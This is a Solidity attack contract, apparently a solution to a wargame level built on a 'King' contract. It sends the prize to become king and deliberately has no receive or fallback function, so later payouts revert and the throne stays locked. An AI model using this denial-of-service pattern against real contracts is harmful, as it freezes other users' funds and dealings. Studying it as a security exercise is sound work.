// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the King Contract
import "./King.sol";

contract KingAttack {
    // Takes the contract address and some Ether
    constructor(address payable target) payable {
        // Retrieves the value of the prize because we need to send more
        uint prize = King(target).prize();
        // Call the function of the original contract and send the value of the prize
        (bool ok, ) = target.call{value: prize}("");
        require(ok, "call failed");
    }

    // This contract doesn't have fallback or receive function
    // So all incoming transactions are reverted :)
}
